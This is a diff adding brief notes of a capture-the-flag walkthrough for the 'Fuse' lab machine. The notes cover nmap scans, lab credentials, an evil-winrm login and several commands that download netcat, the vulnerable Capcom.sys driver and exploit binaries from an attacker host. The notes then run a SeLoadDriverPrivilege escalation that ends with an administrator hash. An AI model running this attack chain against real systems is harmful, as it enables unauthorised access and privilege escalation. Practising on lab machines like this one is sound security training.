@@ -1,0 +1,22 @@
+$ nmap -A -Pn -sC -sV -oN fuse.nmap fuse.htb
+$ nmap -p- --max-retries 5 --min-rate 5000 -oN fuse.all_ports fuse.htb
+> add fabricorp.local fuse.fabricorp.local in /etc/hosts
+> searching CSV file on http://fuse.fabricorp.local/papercut/logs/html/index.htm
+> printer : HP-MFT01
+> password for bhult:Fabricorp01
+> found password for svc-print and login with evil-winrm
+$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193
+> get user.txt
+> enum and find article talk about seloaddriver privilege exploit 
+	+ https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
+
+$ invoke-webrequest -uri http://10.10.14.195/nc.exe -outfile nc.exe
+$ invoke-webrequest -uri http://10.10.14.195/exploit-fuse/Capcom.sys -outfile capcom.sys
+$ invoke-webrequest -uri http://10.10.14.195/exploit-fuse/EOPLOADDRIVER.exe -outfile EOPLOADDRIVER.exe
+$ invoke-webrequest -uri http://10.10.14.195/exploit-fuse/ExploitCapcom_modded.exe -outfile ExploitCapcom_modded.exe
+$ invoke-webrequest -uri http://10.10.14.195/exploit-fuse/netcat.bat -outfile netcat.bat
+
+$ .\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
+$ .\ExploitCapcom_modded.exe
+
+> administrator hash 370ddcf45959b2293427baa70376e14e
